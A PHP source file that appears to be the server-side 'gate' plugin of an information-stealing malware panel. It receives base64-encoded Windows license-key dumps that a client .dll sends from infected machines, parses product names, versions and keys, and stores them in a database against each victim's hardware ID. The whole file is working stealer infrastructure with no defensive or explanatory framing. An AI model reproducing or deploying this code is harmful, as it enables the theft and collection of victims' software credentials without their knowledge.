<?php
/*
This script is used to receive data from the plugin client! It will be included the gate.php. 
The data that plugin is sending is in the $_POST[] variable. You can use your own methods foreach
communicating with clients but its important to respect user preferances about http/https.
*/
if(!isset($initialized))
{
	include('../../pages/404.php');
}
// HWID is automatically passed as $_POST['hwid'];
if(isset($_POST['data']))
{
	$password_list = explode("---------------------------------------------------------------------------",str_replace(array("***************************************************
                                          Windows License Key Recovery Report
                                 ***************************************************","_______________________________________________________________________
 Produced by WindowsLicenseKeyDump from http://www.SecurityXploded.com"),"",trim(base64_decode($_POST['data'])," \t\n\r\0\x0B")));//Keep in mind that wchar_t on windows is UTF-16LE
	
	$hwid = "N/A";
	
	if(isset($_POST['hwid'])) // HWID will always be set. You can however override it if you set it your self in the .dll when sending a post req
	{
		$hwid = $_POST['hwid']; 
	}
	
	foreach($password_list as $item)
	{
		$product = "";
		$version = "";
		$license = "";
		
		$password_array = explode(PHP_EOL, $item);
		foreach($password_array as $password_data)
		{
			if(strpos($password_data,'Product Name:') !== false) 
			{
				$product = str_replace('Product Name:','',$password_data);
			}
			elseif(strpos($password_data,'Version:') !== false)
			{
				$version = str_replace('Version:','',$password_data);
			}
			elseif(strpos($password_data,'Product License Key:') !== false)
			{
				$license = str_replace('Product License Key:','',$password_data);
			}
			
		}
			
		if($product != "")
		{
			// Insert query
			$query = "SELECT * FROM win_license WHERE product = :product AND version = :version AND license = :license AND hwid = :hwid"; 
			$query_params = array(':product' => $product, ':version' => $version, ':license' => $license, ':hwid' => $hwid); 
			
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$result = $stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
			$row = $stmt->fetch();

			// If not found insert it
			if(!$row) 
			{
				$query = "INSERT INTO win_license (product, version, license, hwid) VALUES (:product, :version, :license, :hwid)";
				$query_params = array(':product' => $product, ':version' => $version, ':license' => $license, ':hwid' => $hwid); 
			}
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
		}
	}
	SendResponse("Win Lic stored with success!"); // Not really needed!
}
?>